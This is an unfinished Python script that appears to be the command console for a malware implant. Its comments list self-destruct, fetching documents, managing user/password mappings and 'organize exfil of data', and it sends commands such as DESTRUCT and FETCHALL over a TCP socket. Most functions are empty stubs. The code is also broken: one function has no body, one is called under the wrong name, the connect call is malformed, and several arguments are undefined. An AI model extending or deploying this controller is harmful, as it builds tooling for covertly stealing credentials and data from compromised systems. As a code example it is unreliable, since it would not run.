#list commands for the implant 
#self destruct 
#fetch whole document 
#fetch new changes 
#add user/password mapping 
#delete user 
#get user 
#sleep 
#organize exfil of data 
import socket
import sys


def destruct(s: socket.socket, args: list):
    s.sendall(f"DESTRUCT")


def fetchAll(s: socket.socket, args):
    s.sendall("FETCHALL".encode())
    print(s.recv(1024))


def fetchNew(s, args):
    pass


def addUser(s, args):
    pass


def removeUser(s, args):
    pass


def getUser(s, args):
    pass


def sleep(s, args):
    pass

def recon(s):

def printmenu():
    print("-------COMMAND OPTIONS------")
    print("FETCHALL: get all users and their information")  # TODO


if __name__ == "__main__":
    serverIP = sys.argv[1]
    serverPort = sys.argv[2]

    while True:
        command = input("what is your cmmand")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(serverIP, int(serverPort))
            if command == "DESTRUCT":
                destruct(s)
            elif command == "RECON":
                Recon(s)
            elif command == "FETCHALL":
                fetchAll(s)
            elif command == "FETCHNEW":
                fetchNew(s, args)
            elif command == "ADDUSER":
                addUser(s, args)
            elif command == "REMOVEUSER":
                removeUser(s, args)
            elif command == "GETUSER":
                getUser(s, args)
            elif command == "SLEEP":
                sleep(s, args)
            else:
                print(f"{command} is not a proper command")
